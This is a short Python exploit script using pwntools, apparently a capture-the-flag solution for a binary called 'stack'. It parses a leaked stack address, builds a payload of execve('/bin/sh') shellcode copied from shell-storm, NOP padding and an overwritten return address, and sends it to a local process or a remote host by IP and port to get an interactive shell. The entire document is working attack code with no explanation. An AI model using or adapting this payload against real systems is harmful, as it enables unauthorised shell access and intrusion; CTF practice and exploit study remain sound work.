#!/usr/bin/python

from pwn import *
import sys

def exploit(p):
    address = int(p.recv().split()[6], 16)
    info(hex(address))
    
    # http://shell-storm.org/shellcode/files/shellcode-806.php
    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    buf  = shellcode
    buf += "\x90"*(400-len(shellcode))
    buf += p64(address)

    p.sendline(buf)
    p.interactive()
    

if __name__ == '__main__':
    if len(sys.argv) > 1:
        p = remote('128.199.104.41', 20950)
    else:
        p = process('./stack')
    exploit(p)